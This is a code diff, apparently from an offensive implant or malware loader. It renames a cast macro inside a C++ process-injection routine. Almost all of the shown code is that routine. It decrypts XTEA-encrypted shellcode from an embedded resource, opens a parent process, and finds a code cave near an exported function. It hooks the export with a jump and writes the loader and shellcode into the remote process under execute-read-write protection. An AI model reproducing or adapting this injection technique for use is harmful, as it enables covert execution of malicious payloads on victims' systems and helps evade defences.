@@ -33,9 +33,9 @@ namespace Injection {
 
         //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->ConfigBytes.Key, FALSE);
 
-        Parser::ParserStrcpy(&Parser, CREINTERPRET(LPSTR*, &Ctx->Config.Key), nullptr);
-        Parser::ParserMemcpy(&Parser, CREINTERPRET(PBYTE*, &Ctx->Root), nullptr);
-        Parser::ParserMemcpy(&Parser, CREINTERPRET(PBYTE*, &Ctx->LE), nullptr);
+        Parser::ParserStrcpy(&Parser, REINTC(LPSTR*, &Ctx->Config.Key), nullptr);
+        Parser::ParserMemcpy(&Parser, REINTC(PBYTE*, &Ctx->Root), nullptr);
+        Parser::ParserMemcpy(&Parser, REINTC(PBYTE*, &Ctx->LE), nullptr);
 
         Parser::ParserStrcpy(&Parser, &Threadless.Parent.Buffer, &Threadless.Parent.Length);
         Parser::ParserStrcpy(&Parser, &Threadless.Module.Buffer, &Threadless.Module.Length);
@@ -46,7 +46,7 @@ namespace Injection {
         Parser::DestroyParser(&Parser);
 
         if (
-            !(pExport = Memory::LdrGetExport(CREINTERPRET(PBYTE, Threadless.Module.Buffer), CREINTERPRET(PBYTE, Threadless.Export.Buffer))) ||
+            !(pExport = Memory::LdrGetExport(REINTC(PBYTE, Threadless.Module.Buffer), REINTC(PBYTE, Threadless.Export.Buffer))) ||
             !(Rsrc = Memory::LdrGetIntResource(Base, IDR_RSRC_BIN1))) {
             return;
         }
@@ -54,11 +54,11 @@ namespace Injection {
         Shellcode = Ctx->Nt.RtlAllocateHeap(LocalHeap, 0, Rsrc->Size);
         cbShellcode = Threadless.Loader.Length + Rsrc->Size;
 
-        MmPatchData(i, CREINTERPRET(PBYTE, Shellcode), (i), CREINTERPRET(PBYTE, Rsrc->ResLock), (i), Rsrc->Size);
+        MmPatchData(i, REINTC(PBYTE, Shellcode), (i), REINTC(PBYTE, Rsrc->ResLock), (i), Rsrc->Size);
         Ctx->win32.FreeResource(Rsrc->hGlobal);
 
         if (
-            !(Proc = Process::LdrGetParentHandle(CREINTERPRET(PBYTE, Threadless.Parent.Buffer))) ||
+            !(Proc = Process::LdrGetParentHandle(REINTC(PBYTE, Threadless.Parent.Buffer))) ||
             !(pHook = Memory::MmCaveHunter(Proc, pExport, cbShellcode))) {
             return;
         }
@@ -66,13 +66,13 @@ namespace Injection {
         auto LoaderRva = pHook - (pExport + 5);
         auto hookCpy = pHook;
 
-        MmPatchData(i, CREINTERPRET(PBYTE, &exportCpy), (i), CREINTERPRET(PBYTE, &pExport), (i), sizeof(LPVOID))
-        MmPatchData(i, Threadless.Loader.Buffer, (0x12 + i), CREINTERPRET(PBYTE, &exportCpy), (i), sizeof(LPVOID))
-        MmPatchData(i, Threadless.Opcode.Buffer, (0x01 + i), CREINTERPRET(PBYTE, &LoaderRva), (i), 4)
+        MmPatchData(i, REINTC(PBYTE, &exportCpy), (i), REINTC(PBYTE, &pExport), (i), sizeof(LPVOID))
+        MmPatchData(i, Threadless.Loader.Buffer, (0x12 + i), REINTC(PBYTE, &exportCpy), (i), sizeof(LPVOID))
+        MmPatchData(i, Threadless.Opcode.Buffer, (0x01 + i), REINTC(PBYTE, &LoaderRva), (i), 4)
 
         if (
-            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, CREINTERPRET(PVOID*, &exportCpy), &cbShellcode, PAGE_EXECUTE_READWRITE, &Protect)) ||
-            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, CREINTERPRET(PVOID, pExport), CREINTERPRET(PVOID, Threadless.Opcode.Buffer), Threadless.Opcode.Length, &Write))
+            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, REINTC(PVOID*, &exportCpy), &cbShellcode, PAGE_EXECUTE_READWRITE, &Protect)) ||
+            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, REINTC(PVOID, pExport), REINTC(PVOID, Threadless.Opcode.Buffer), Threadless.Opcode.Length, &Write))
             || Write != Threadless.Opcode.Length) {
             return;
         }
@@ -80,17 +80,17 @@ namespace Injection {
         cbShellcode = Threadless.Loader.Length + Rsrc->Size;
 
         if (
-            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, CREINTERPRET(LPVOID*, &hookCpy), &cbShellcode, PAGE_READWRITE, &Protect)) ||
+            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, REINTC(LPVOID*, &hookCpy), &cbShellcode, PAGE_READWRITE, &Protect)) ||
             !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook), Threadless.Loader.Buffer, Threadless.Loader.Length, &Write)) ||
             Write != Threadless.Loader.Length) {
             return;
         }
 
-        Xtea::XteaCrypt(CREINTERPRET(PBYTE, Shellcode), Rsrc->Size, Ctx->Config.Key, FALSE);
+        Xtea::XteaCrypt(REINTC(PBYTE, Shellcode), Rsrc->Size, Ctx->Config.Key, FALSE);
 
         if (
             !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook + Threadless.Loader.Length), Shellcode, Rsrc->Size, &Write)) || Write != Rsrc->Size ||
-            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, CREINTERPRET(LPVOID*, &pHook), &cbShellcode, Protect, &Protect))) {
+            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, REINTC(LPVOID*, &pHook), &cbShellcode, Protect, &Protect))) {
             return;
         }
 
